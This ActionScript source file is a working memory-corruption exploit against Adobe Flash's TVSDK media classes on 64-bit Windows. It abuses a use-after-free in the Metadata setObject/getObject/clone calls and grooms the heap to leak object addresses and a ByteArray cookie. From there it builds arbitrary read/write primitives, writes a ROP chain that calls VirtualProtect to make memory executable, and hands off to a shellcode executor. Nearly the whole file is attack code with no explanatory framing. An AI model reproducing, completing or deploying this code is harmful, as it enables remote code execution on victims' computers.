package 
{
	/**
	 * ...
	 * @author ...
	 */
	import com.adobe.tvsdk.mediacore.info.Track;
	import flash.display.*;
	import flash.net.*;
	import com.adobe.tvsdk.mediacore.events.*;
	import com.adobe.tvsdk.mediacore.timeline.advertising.*;
	import com.adobe.tvsdk.mediacore.*;
	import com.adobe.tvsdk.mediacore.qos.metrics.*;
	import com.adobe.tvsdk.mediacore.metadata.*;
	import com.adobe.tvsdk.mediacore.utils.*;
	import flash.accessibility.*;
	import flash.utils.*;
	import flash.external.*;
	
	public class ExpWin64 extends GlobalWin64
	{
		
		public function ExpWin64() 
		{
			
		}
		
		static var
			_ba:ByteArray,		// controlled ByteArray
			_baOffs:uint,
			_base:Number,		// new _ba.m_buffer.array*
			_baseMax:Number;	// _base + _ba.length
		
		static var	N32:Number = Math.pow(2, 32);
			
		// declare dummy victim function
		static function Payload(...a)
		{
			if (a[0])
			{
				var ropAddrPointer:Number = a[0];
				var ropAddr:Number = a[1];
				var vAddr:Number = a[2];
				var length:Number = a[3];
				var vp:Number = a[4];
				var stackAddr:Number = a[5]
	//			Log("ropAddrPointer: " + Hex(ropAddrPointer));
	//			var retAddr:Number = Get(stackAddr) - 0xb0;
	//			Log("retAddr: " + Hex(retAddr));
				Set(ropAddrPointer, ropAddr);
				ropAddrPointer += 8;
				Set(ropAddrPointer, ropAddr);
				Set(ropAddrPointer + 8, vAddr-8); //r9 -> pOldProtect, 4th arg
				Set(ropAddrPointer + 8 * 2, 0x40); //r8 -> newProtect, 3rd arg
				Set(ropAddrPointer + 8 * 3, length); //rdx -> size, 2nd arg
				Set(ropAddrPointer + 8 * 4, vAddr); //rcx -> address, 1st arg
				Set(ropAddrPointer + 8 * 5, 0xdeadbeef); //rax, junk
				Set(ropAddrPointer + 8 * 6, vp); //virtualProtect addr
				Set(ropAddrPointer + 8 * 7, vAddr);
				//Log("ropAddrPointer: write done 0");
			}
		}
		
		static function Log(s)
		{
			//ExternalInterface.call("alert", s);
			ExternalInterface.call("log", s);
		}
		
		// join two uints as uint64
		static function Num(hi:uint, low:uint):Number
		{
			var n:Number = hi;
			if (n != 0) n *= N32;
			return n + low;
		}
		
		// get high uint from uint64
		static function Hi(n:Number):uint
		{
			return uint(Math.floor(n / N32) & (N32-1));
		}

		// get low uint from uint64
		static function Low(n:Number):uint
		{
			return uint(n & (N32-1));
		}	
			
		// converts two uints to hex string
		static function Hex(n:Number):String
		{
			if (n >= 0 && n <= 9) return n.toString()
			else return "0x" + n.toString(16);
		}

		// reads uint64
		static function Get64(offs:uint, mask:uint = 0xffffffff):Number
		{
//			return Num(_vu[offs+1], _vu[offs] & mask);
			return 0;
		}

		// writes uint64
		static function Set64(offs:uint, n:Number)
		{
			god_ba_0.position = offs;
			god_ba_0.writeUnsignedInt(Low(n));
			god_ba_0.writeUnsignedInt(Hi(n));
		}

		static function GB0Set64(offs:uint, n:Number)
		{
			god_ba_0.position = offs;
			god_ba_0.writeUnsignedInt(Low(n));
			god_ba_0.writeUnsignedInt(Hi(n));			
		}
		
		static function GB0Set32(offs:uint, n:uint)
		{
			god_ba_0.position = offs;
			god_ba_0.writeUnsignedInt(n);			
		}
		
		static function GB0Get64(offs:uint, mask:uint = 0xffffffff):Number
		{
			god_ba_0.position = offs;
			var low32 = god_ba_0.readUnsignedInt();
			var high32 = god_ba_0.readUnsignedInt();
			return Num(high32, low32 & mask);		
		}
		
		// sets new address pointer for _ba
		static function SetBase(addr:Number)
		{
			if (addr < _base || addr >= _baseMax) {
				GB0Set64(0x50+0x40, addr);
				GB0Set32(0x64+0x40, Low(addr) ^ ByteArray_m_array_cookie ^ Hi(addr));				
				_base = addr;
				_baseMax = addr + 0xfffffff0;
			}
		}

		// reads uint from the memory address
		static function Get32(addr:Number):uint
		{
			if (addr < 0x1000) throw new Error("Get32(" + Hex(addr) + ")");

			SetBase(addr);
			_ba.position = uint((addr - _base) & (N32-1));
			return _ba.readUnsignedInt();
		}

		// writes uint into the memory address
		static function Set32(addr:Number, u:uint)
		{
		 	if (addr < 0x1000) throw new Error("Set32(" + Hex(addr) + ")");

			SetBase(addr);
			_ba.position = uint((addr - _base) & (N32-1));
			_ba.writeUnsignedInt(u);
		}

		// reads uint64 from the memory address
		static function Get(addr:Number, mask:uint = 0xffffffff):Number
		{
		 	if (addr < 0x1000) throw new Error("Get(" + Hex(addr) + ")");

			SetBase(addr);
			_ba.position = uint((addr - _base) & (N32-1));
			mask &= _ba.readUnsignedInt();
			return Num(_ba.readUnsignedInt(), mask);
		}

		// writes uint64 into the memory address
		static function Set(addr:Number, n:Number)
		{
		 	if (addr < 0x1000) throw new Error("Set(" + Hex(addr) + ")");

			SetBase(addr);
			_ba.position = uint((addr - _base) & (N32-1));
			_ba.writeUnsignedInt(Low(n));
			_ba.writeUnsignedInt(Hi(n));
		}

		// returns object's address
		static function GetAddr(o:Object):Number
		{
			arr2[1] = o;
			god_ba_1.position = 0x18;
			var low32:uint = god_ba_1.readUnsignedInt();
			var high32:uint = god_ba_1.readUnsignedInt();
			return Num(high32, low32) - 1; // atom decrement
		}

		// get memory dump // for RnD
		static function Dump(addr:Number, len:uint):String
		{
			var s:String = "", l:int;
			for(var i:uint; i < len; i++, addr+=8) {
				s += Hex(Get(addr)) + ",";
				if (s.length - l > 64) { s += "<br>"; l = s.length; }
			}
			return s;
		}				
		
		///////////////////////////////////////////////////////////
		
		public static var ByteArray_addr;
		public static var ByteArray_addr_low:uint;
		public static var ByteArray_addr_high:uint;					
		public static var ByteArray_m_array_addr;
		public static var ByteArray_m_array_addr_low:uint;
		public static var ByteArray_m_array_addr_high:uint;
		public static var sig_vtable;
		public static var sig_vtable_low:uint;
		public static var sig_vtable_high:uint;
		public static var HashTable_addr;
		public static var HashTable_addr_low:uint;
		public static var HashTable_addr_high:uint;
		//public static var qName_localName_addr;
		public static var qName_localName_addr_low:uint;
		public static var qName_localName_addr_high:uint;
		//public static var qName_uri_addr;
		public static var qName_uri_addr_low:uint;
		public static var qName_uri_addr_high:uint;
		
		public static var ExpBufStr_addr;
		public static var ExpBufStr_addr_low:uint;
		public static var ExpBufStr_addr_high:uint;
		
//		public static var LeakObjVector_addr;
		public static var LeakObjVector_addr_low:uint;
		public static var LeakObjVector_addr_high:uint;	
		
		public static var ByteArray_m_array_cookie:uint;		
		public static var ByteArray_str;
		
		public static var god_ba_0;
		public static var god_ba_1;
		public static var god_ba_2;
		
		public static var arr:Array = [];
		public static var arr2:Array = [];
		public static var arr3:Array = [];
		public static var ins_String_0;
		public static var ins_Metadata_0:Metadata;
		public static var ins_MediaPlayerItemEvent_0:MediaPlayerItemEvent;
		
		public static var v = new Vector.<uint>(0x3fff);
		public static var ctName:String;
		
		static var arr_reclaimDicForWholePage = [];
		static var arr_gc = [];
		static var desc = describeType(MediaPlayerItemEvent);
		//desc.fname;
		static var qName:QName = new QName(desc.@uri.toString(), "type");
		
		var leaveHole2Cnt:uint = 0;
		
		static function reclaimDicForWholePage()
		{
			for (var j = 0; j < 0x64*0x100; j++)
			{
				arr_reclaimDicForWholePage[j] = j.toString(16);
			}
		}
		
		static function leaveHole2()
		{
			//0x64*0x28+0x60=0x1000
			for (var j = 0; j < 0x64*0x100; j++)
			{
				arr_gc[j] = j.toString(16);
			}
		
			var offset:uint = Math.floor(Math.random() * 7);
			trace(offset);
			
			arr_gc[0x3200] = null;
			
			for (var j = 0; j < 0x1000; j++)
			{
				arr3[j] = new Dictionary();
			}
			
			trace("leave hole done!");
		}

		public static function go() 
		{
			//prepare arr first to avoid junk in memory
			var arr_reclaim = [];
			for (var k = 0; k < 0x4000; k++ )
			{				
				arr_reclaim[k] = [];
			}
			
			var arr:Array = [];
			
			//ctor
			ins_String_0 = new String();
			var resultArr:Array = new Array();			
			var setargs1:Array = [];	
			
			ins_MediaPlayerItemEvent_0 = new MediaPlayerItemEvent(8, null, null);
			ins_Metadata_0 = new Metadata();
		
			setargs1.push(ins_String_0);
			setargs1.push(ins_MediaPlayerItemEvent_0);
			invoke_ins_method_special("setObject", ins_Metadata_0, setargs1, 0);
			if(_g_dic.hasOwnProperty("object") == false)
				_g_dic["object"] = new Array();
			
			var getargs:Array = new Array();
			getargs.push(ins_String_0);
			
			_g_dic["object"].push(invoke_ins_method_special("getObject", ins_Metadata_0, getargs,1));
			
			var setargs1:Array = [];
			var ins_Metadata_1 = invoke_ins_method("clone", ins_Metadata_0, setargs1);
			
			var setargs1:Array = [];			
			setargs1.push(ins_String_0);
			setargs1.push(_g_dic["object"][0]);
			invoke_ins_method("setObject", ins_Metadata_1, setargs1);
			setargs1.pop();
			setargs1.pop();
			
			var getargs:Array = new Array();
			getargs.push(ins_String_0);
			_g_dic["object"].push(invoke_ins_method("getObject", ins_Metadata_1, getargs));			
			
			trace("repro_5 gc start and reclaim with str");			
			for (var j = 0; j < 0x1000/2; j++)
			{
				arr[j] = FormatClassName("com.adobe.tvsdk.mediacore.metadata::Metadata_1<*String>") + j;
			}
			trace("repro_5 gc end, reclaim with str end!!!");
			
			_g_dic["object"].pop();			
			_g_dic["object"].pop();

			for (var j = 0; j < 0x1000; j++)
			{
				arr3[j] = new ByteArray();
				arr3[j].endian = "littleEndian";
				arr3[j].length = 0x1000;
				arr3[j].position = 0;
				arr3[j].writeUnsignedInt(0x11223344);
			}
			var ba_spec_0:ByteArray = arr3[0x100];
			
			trace("release str once");

			arr_gc = null;

			trace("release all page done!");
			
			for (var k = 0; k < 0x1000; k++ )
			{
				for (var j = 0; j < 0x0e; j++)
				{
					arr_reclaim[k][j] = {0x888880:arr3[0x100], 0x888881:0x333331, 0x888882:0x333332, 0x888883:0x333333, 
										0x888884:0x333334, 0x888885:arr3[0x100], 0x888886:0x333336, 0x888887:0x333337,
										0x888888:0x333338, 0x888889:0x333339, 0x88888a:arr3[0x100]
					}	
				}
			}
			trace("relaim arr_gc done!");
			
			var result = false;
			for (var j = 0; j < 0x1000 / 2; j++)
			{
				if (arr[j].length == 0x0199998e || arr[j].length == 0x019999b6)
				{
					ByteArray_str = arr[j];
					
					sig_vtable_low = readLow32(0x30);
					sig_vtable_high = readHigh32(0x30);					
					sig_vtable = sig_vtable_high.toString(16) + sig_vtable_low.toString(16);
					Log(arr[j].length.toString(16) + " " + sig_vtable);
					
					ByteArray_addr_low = readLow32(0x20);
					ByteArray_addr_low -= 0x30;
					ByteArray_addr_high = readHigh32(0x20);					
					ByteArray_addr = ByteArray_addr_high.toString(16) + ByteArray_addr_low.toString(16);
					
					ByteArray_m_array_addr_low = readLow32(0x88);
					ByteArray_m_array_addr_high = readHigh32(0x88);			
					ByteArray_m_array_addr = ByteArray_m_array_addr_high.toString(16) + ByteArray_m_array_addr_low.toString(16);
					
					resetObjectValueWithHashTable(arr_reclaim);			
					HashTable_addr_low = readLow32(0x20);
					HashTable_addr_low -= 1;
					HashTable_addr_high = readHigh32(0x20);					
					HashTable_addr = HashTable_addr_high.toString(16) + HashTable_addr_low.toString(16);
					
					resetObjectValueWithQName(arr_reclaim);
					qName_localName_addr_low = readLow32(0x20);
					qName_localName_addr_high = readHigh32(0x20);				
					var qName_localName_addr = qName_localName_addr_high.toString(16) + qName_localName_addr_low.toString(16);
					
					qName_uri_addr_low = readLow32(0x28);
					qName_uri_addr_high = readHigh32(0x28);
					var qName_uri_addr = qName_uri_addr_high.toString(16) + qName_uri_addr_low.toString(16);
					
					resetObjectValueWithLeakObjArr(arr_reclaim);
					LeakObjVector_addr_low = readLow32(0x20);
					LeakObjVector_addr_high = readHigh32(0x20);
					
					resetObjectValueWithVector(arr_reclaim);
					ExpBufStr_addr_low = readLow32(0x30);
					ExpBufStr_addr_high = readHigh32(0x30);				
					ExpBufStr_addr = ExpBufStr_addr_high.toString(16) + ExpBufStr_addr_low.toString(16);
					ExpBufStr_addr = ByteArray_str.substr(0x2f, 8); 
										
					constructExpBuffer(ExpBufStr_addr_high, ExpBufStr_addr_low);										
					var HashTable_addr_low_item:uint;
					if (arr[j].length == 0x0199998e)
					{
						HashTable_addr_low_item = HashTable_addr_low + 0x10;
					}else if (arr[j].length == 0x019999b6)
					{
						HashTable_addr_low_item = HashTable_addr_low + 0x60;
					}else
					{
						HashTable_addr_low_item = HashTable_addr_low + 0xb0;
					}				
					constructWritePrimitive(HashTable_addr_low_item, HashTable_addr_high, ByteArray_m_array_addr_low, ByteArray_m_array_addr_high);
					writePrimitive(ExpBufStr_addr);
					
					ByteArray_m_array_cookie = readLow32(0x28+1);		
					ByteArray_m_array_cookie ^= 0x1000;
					Log("ByteArray_m_array_cookie " + ByteArray_m_array_cookie.toString(16));
					
					writePrimitive2();
					
					var res = final_prepare()
					if (res == 2)
					{
						ShellWin64.Exec();
					}
					
					result = true;
				}
			}
			return result;
			
		}
		
		public static function final_prepare():uint
		{
			var result:uint = 0;
			//prepare leak object address
			
			/*
			 *  0000023f`ffe206d0 00007ff99e5462c0 0000000000000001
				0000023f`ffe206e0 0000030a533c4000 0000100000001000
				0000023f`ffe206f0 b6d0e6fb00000000 e5ecb5f1e5ecb5f1
				0000023f`ffe20700 00000000e5eca5f1 0008000000000000
				0000023f`ffe20710 00007ff99e5462c0 0000000000000001
				0000023f`ffe20720 0000030a533c3000 0000100000001000
				0000023f`ffe20730 b6d096fb00000000 e5ecb5f1e5ecb5f1
				0000023f`ffe20740 00000000e5eca5f1 0008000000000000
			*/
			
			//set and find god_ba_1 for leak any object address
			GB0Set64(0x50, Num(LeakObjVector_addr_high, LeakObjVector_addr_low));
			GB0Set32(0x64, LeakObjVector_addr_low ^ ByteArray_m_array_cookie ^ LeakObjVector_addr_high);
			for (var j = 0; j < 0x1000; j++)
			{
				arr3[j].position = 0x10;
				if(arr3[j].readUnsignedInt() == 0x4444406)
				{
					god_ba_1 = arr3[j];
					result += 1;
					break;
				}
			}
			
			//set real god byteArray to do real read and write primitive
			GB0Set32(0x58 + 0x40, 0xffffffff); //capacity
			GB0Set32(0x5c + 0x40, 0xfffffffe); //length
			GB0Set32(0x68 + 0x40, 0xffffffff ^ ByteArray_m_array_cookie); //capacity_cookie
			GB0Set32(0x6c + 0x40, 0xfffffffe ^ ByteArray_m_array_cookie); //length_cookie

			for (var j = 0; j < 0x1000; j++)
			{
				if (arr3[j].length > 0xfffffff0)
				{
					_ba = arr3[j];
					_base = GB0Get64(0x50+40);
					_baseMax = _base + 0xfffffff0;
					result += 1;
					break;
				}
			}
			
			return result;
		}
		
		public static function readLow32(offset:int):uint
		{
			var low32:uint = (ByteArray_str.charCodeAt(3+offset-1) << 24);
			low32 |= (ByteArray_str.charCodeAt(2+offset-1)<<16);
			low32 |= (ByteArray_str.charCodeAt(1+offset-1)<<8);
			low32 |= (ByteArray_str.charCodeAt(0+offset-1));
			return low32;
		}
		
		public static function readHigh32(offset:int):uint
		{
			//high32 = (ByteArray_str.charCodeAt(7+offset-1)<<24);
			//high32 |= (ByteArray_str.charCodeAt(6+offset-1)<<16);			
			var high32:uint = (ByteArray_str.charCodeAt(5+offset-1)<<8);
			high32 |= (ByteArray_str.charCodeAt(4+offset-1));
			return high32;
		}
		
		public static function initExpBuffer():Boolean
		{
			for (var i:int = 0; i < 0x3fff; i++ )
				v[i] = 0;
			return true;
		}
		
		public static function constructExpBuffer(vectorAddrHigh, vectorAddrLow):Boolean
		{
			v[0xc8 / 4 - 1] = vectorAddrLow + 0x20;
			v[0xc8 / 4 - 1 + 1] = vectorAddrHigh;
			
			v[0x20 / 4 - 1] = vectorAddrLow + 0x1000;
			v[0x20 / 4 - 1 + 1] = vectorAddrHigh;
			
			v[0x1008 / 4 - 1] = vectorAddrLow + 0x1010;
			v[0x1008 / 4 - 1 + 1] = vectorAddrHigh;
			
			v[(0x1010 + 0x748) / 4 - 1] = 0x10000;
			
			//1st writeprimitive
			//or      byte ptr [r8+rax],2
			v[0x1020 / 4 - 1] = vectorAddrLow + 0x1030;
			v[0x1020 / 4 - 1 + 1] = vectorAddrHigh;
			
			v[(0x1010 + 0x74c) / 4 - 1] = 0x01;
			
			v[(0x1010 + 0x770 + 0x28) / 4 - 1] = vectorAddrLow + 0x40;
			v[(0x1010 + 0x770 + 0x28) / 4 - 1 + 1] = vectorAddrHigh;

			//prevent crash
			v[(0x1038) / 4 - 1] = vectorAddrLow + 0x60;
			v[(0x1038) / 4 - 1 + 1] = vectorAddrHigh;
			
			v[(0x1044) / 4 - 1] = 0x01;
			
			v[0x70 / 4 - 1] = qName_localName_addr_low;
			v[0x70 / 4 - 1 + 1] = qName_localName_addr_high;
			
			v[0x78 / 4 - 1] = qName_uri_addr_low;
			v[0x78 / 4 - 1 + 1] = qName_uri_addr_high;
			
			v[0x80 / 4 - 1] = 0x06;
			
			return true;
		}
		
		public static function constructWritePrimitive(address_low, address_high, value_low, value_high)
		{
			//value
			v[(0x1010 + 0x770 + 8) / 4 - 1] = value_low;
			v[(0x1010 + 0x770 + 8) / 4 - 1 + 1] = value_high;
			
			//address
			v[(0x1010 + 0x770 + 0x18) / 4 - 1] = address_low;
			v[(0x1010 + 0x770 + 0x18) / 4 - 1 + 1] = address_high;
		}
		
		public static function resetObjectValueWithHashTable(arr_reclaim:Array):void
		{	
			for (var k = 0; k < 0x1000; k++ )
			{
				for (var j = 0; j < 0x0e; j++)
				{
					arr_reclaim[k][j][0x888880] = arr_reclaim[k][j];
					arr_reclaim[k][j][0x888885] = arr_reclaim[k][j];
					arr_reclaim[k][j][0x88888a] = arr_reclaim[k][j];
				}
			}
		}
		
		public static function resetObjectValueWithQName(arr_reclaim:Array):void
		{	
			for (var k = 0; k < 0x1000; k++ )
			{
				for (var j = 0; j < 0x0e; j++)
				{
					arr_reclaim[k][j][0x888880] = qName;
					arr_reclaim[k][j][0x888885] = qName;
					arr_reclaim[k][j][0x88888a] = qName;
				}
			}
		}

		public static function resetObjectValueWithLeakObjArr(arr_reclaim:Array):Boolean
		{		
			arr2[0] = 0x888880;
			for (var k = 0; k < 0x1000; k++ )
			{
				for (var j = 0; j < 0x0e; j++)
				{
					arr_reclaim[k][j][0x888880] = arr2;
					arr_reclaim[k][j][0x888885] = arr2;
				}
			}
			
			return true;
		}
		
		public static function resetObjectValueWithVector(arr_reclaim:Array):Boolean
		{
			v[0] = 0x11225588;
			v[2] = 0x55667788;
			
			for (var k = 0; k < 0x1000; k++ )
			{
				for (var j = 0; j < 0x0e; j++)
				{
					arr_reclaim[k][j][0x888880] = v;
					arr_reclaim[k][j][0x888885] = v;
					arr_reclaim[k][j][0x88888a] = v;
				}
			}		
			return true;
		}
		

		public static function writePrimitive(expbuf:*):void
		{
			//trigger write
			var exp1 = new UAFWin64();
			exp1.go(expbuf);
			
			trace("reuse again, trigger write!!!");

			try{_g_dic["object"][0][qName];}catch (e:Error){}
		}
		
		public static function writePrimitive2():void
		{
			initExpBuffer();
			constructExpBuffer(ExpBufStr_addr_high, ExpBufStr_addr_low);
			constructWritePrimitive(ByteArray_m_array_addr_low+0x10, ByteArray_m_array_addr_high, ByteArray_m_array_addr_low, ByteArray_m_array_addr_high);
			try{_g_dic["object"][0][qName]; }catch (e:Error){}
			
			initExpBuffer();
			constructExpBuffer(ExpBufStr_addr_high, ExpBufStr_addr_low);
			var ByteArray_m_buffer_check:uint = ByteArray_m_array_addr_low ^ ByteArray_m_array_addr_high ^ ByteArray_m_array_cookie;
			constructWritePrimitive(ByteArray_m_array_addr_low+0x20, ByteArray_m_array_addr_high, 0, ByteArray_m_buffer_check);
			try{_g_dic["object"][0][qName]; }catch (e:Error){}
			//ExternalInterface.call("alert", "trigger write done!");
			
			trace("all done, try to find big array");
			for (var j = 0; j < 0x1000; j++)
			{
				arr3[j].position = 0;
				if(arr3[j].readUnsignedInt()!=0x11223344)
				{			
					trace("Boooooooom!!!find big array!!!");			
					var dword0:uint = arr3[j][3] << 24 | arr3[j][2] << 16 | arr3[j][1] << 8 | arr3[j][0];
					var dword1:uint = arr3[j][7] << 24 | arr3[j][6] << 16 | arr3[j][5] << 8 | arr3[j][4];
					var qword:String = dword1.toString(16) + dword0.toString(16);
					var s = "find god ByteArray in " + j + "; the first qword is " + qword;
					ExternalInterface.call("log", s);
					//Log(s);
					god_ba_0 = arr3[j];
					break;
				}
			}
		}
	
		public static function invoke_ins_method(funcName:String, instance:Object, args:Array):*
		{
			var func:Function;
			if (instance != null)
				func = (instance[funcName] as Function);
			else
				return null;

			var result:* = null;
			var error:Error = null;
			
			try {
				result = func.apply(instance, args);
			}catch (e:ArgumentError) 
			{
				var st:Array = e.getStackTrace().split(/\n/, 2);
				if (st.length < 2 || st[1] == "\tat Function/http://adobe.com/AS3/2006/builtin::apply()")	
					throw e;
				
				error = e;
			}
			catch (e:Error) {
				error = e;
			}

			return result;
		}

		public static function invoke_ins_method_special(funcName:String, instance:Object, args:Array, flag:int):*
		{
			var func:Function;
			if (instance != null)
				func = (instance[funcName] as Function);
			else
				return null;

			var result:* = null;
			var error:Error = null;
			
			try {
				if (flag)
					leaveHole2();
				result = func.apply(instance, args);

			}catch (e:ArgumentError) {
				var st:Array = e.getStackTrace().split(/\n/, 2);
				if (st.length < 2 || st[1] == "\tat Function/http://adobe.com/AS3/2006/builtin::apply()")	
					throw e;
				
				error = e;
			}
			catch (e:Error) {
				error = e;
			}

			return result;
		}
		
		public static function FormatClassName(classTypeName:String):String
		{
			ctName = classTypeName.replace(/::/g, "__");
			ctName = ctName.replace(/</g, "");
			ctName = ctName.replace(/>/g, "");
			ctName = ctName.replace(/\*/g, "star");
			return ctName.replace(/\./g, "_");
		}
	}
}